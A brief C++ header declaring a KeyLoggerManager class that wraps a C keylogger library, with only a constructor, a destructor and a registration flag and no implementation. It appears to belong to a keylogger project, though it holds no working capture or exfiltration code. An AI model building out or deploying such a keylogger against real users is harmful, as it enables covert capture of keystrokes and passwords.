#ifndef KEYLOGGER_MANAGER_H
#define KEYLOGGER_MANAGER_H

extern "C" {
#include "KeyLogger.h"  // Include the C header
}

class KeyLoggerManager {
public:
    // Constructor: Initialize the keylogger
    KeyLoggerManager();

    // Destructor: Cleanup the keylogger
    ~KeyLoggerManager();

private:
    bool isRegistered;  // Flag to track if the keylogger is registered
};

#endif // KEYLOGGER_MANAGER_H
